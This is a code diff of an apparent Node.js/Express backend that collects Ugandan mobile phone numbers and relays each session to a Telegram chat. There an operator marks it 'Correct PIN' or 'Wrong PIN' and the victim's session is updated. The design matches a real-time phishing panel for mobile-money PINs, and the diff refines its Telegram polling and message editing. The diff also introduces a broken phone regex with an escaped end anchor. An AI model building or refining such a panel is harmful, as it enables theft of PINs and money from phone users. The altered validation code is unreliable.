@@ -21,6 +21,7 @@ const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const requests = new Map();
 
+// Session cleaner loop running every 5 minutes
 setInterval(() => {
   const now = Date.now();
   for (const [id, data] of requests.entries()) {
@@ -33,7 +34,7 @@ setInterval(() => {
 async function telegram(method, payload) {
   if (!BOT_TOKEN || !CHAT_ID) throw new Error("Missing config credentials.");
   
-const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {  
+  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {  
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(payload)
@@ -47,16 +48,13 @@ const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
 app.post("/api/phone", (req, res) => {
   let phone = String(req.body.phone || "").trim();
   
-  // Strip country code if user accidentally types it out
   if (phone.startsWith("+256")) phone = phone.replace("+256", "");
   if (phone.startsWith("256")) phone = phone.replace("256", "");
   
-  // Validates standard 9-digit Ugandan mobile format (e.g., 778260583)
-  if (!/^(7\d{8})$/.test(phone)) {
+  if (!/^(7\d{8})\$/.test(phone)) {
     return res.status(400).json({ error: "Invalid format phone number." });
   }
   
-  // Format with country prefix for the Telegram delivery layout
   const formattedPhone = `0${phone}`; 
   const numericSuffix = Math.floor(100000000 + Math.random() * 900000000);
   
@@ -149,46 +147,80 @@ app.post("/api/retry", (req, res) => {
   return res.status(400).json({ error: "Error resetting layout." });
 });
 
+// --- TELEGRAM LONG POLLING MECHANISM & ACTION COMPLETIONS ---
 let offset = 0;
 async function pollTelegram() {
-  if (!BOT_TOKEN || !CHAT_ID) return;
+  if (!BOT_TOKEN || !CHAT_ID) {
+    console.warn("Poller inactive: Missing environment secrets setup tokens.");
+    return;
+  }
+  
+  console.log("Telegram control interface loop active and listening...");
+  
   while (true) {
     try {
-      const data = await telegram("getUpdates", { offset, timeout: 25, allowed_updates: ["callback_query"] });
+      const data = await telegram("getUpdates", { 
+        offset, 
+        timeout: 25, 
+        allowed_updates: ["callback_query"] 
+      });
+      
       for (const upd of data.result || []) {
         offset = upd.update_id + 1;
         const cb = upd.callback_query;
         if (!cb) continue;
         
         const parts = String(cb.data || "").split(":");
-        // ✅ FIXED: Correctly extracts the action string from array instead of comparing the entire array object
-        const action = parts[0]; 
-        const reqId = parts.slice(1).join(":");
-        const request = requests.get(reqId);
+        const action = parts[0];
+        const requestId = parts[1];
         
-        if (request && request.status === "pending" && ["approve", "decline"].includes(action)) {
-          if (action === "approve") {
-            request.status = "approved";
-          } else if (action === "decline") {
-            request.status = "declined";
-          }
-          
-          await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: `Action registered: ${action}` });
-          
-          const statusMarker = action === "approve" ? "✅ CORRECT PIN" : "❌ WRONG PIN";
-          await telegram("sendMessage", {
-            chat_id: CHAT_ID,
-            text: `${statusMarker} processed for Phone: ${request.phone}`
+        const request = requests.get(requestId);
+        if (!request) {
+          await telegram("answerCallbackQuery", { 
+            callback_query_id: cb.id, 
+            text: "Session timed out or does not exist." 
           });
+          continue;
+        }
+
+        let updatedText = cb.message.text;
+
+        if (action === "approve") {
+          request.status = "approved";
+          updatedText += "\n\n✅ Correct PIN";
+          
+          await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: "Approved!" });
+        } else if (action === "decline") {
+          request.status = "declined";
+          updatedText += "\n\n❌ Wrong PIN";
+          
+          await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: "Declined." });
+        }
+
+        // Edit message layout inside Telegram to remove options once processed
+        try {
+          await telegram("editMessageText", {
+            chat_id: CHAT_ID,
+            message_id: cb.message.message_id,
+            text: updatedText,
+            reply_markup: { inline_keyboard: [] } // Remove clickable action panels completely
+          });
+        } catch (editError) {
+          console.error("Message layout update issue:", editError.message);
         }
       }
-    } catch (e) {
+    } catch (err) {
+      console.error("Polling error iteration issue:", err.message);
+      // Wait brief duration during exceptions to keep network thread unblocked
       await new Promise(r => setTimeout(r, 4000));
     }
   }
 }
 
-pollTelegram();
+// Start Server & Background Listening Systems
+app.listen(PORT, () => {
+  console.log(`Server listening onto platform endpoint port: ${PORT}`);
+  pollTelegram();
+});
 
-app.listen(PORT, () => console.log(`Server executing successfully on port ${PORT}`));
 
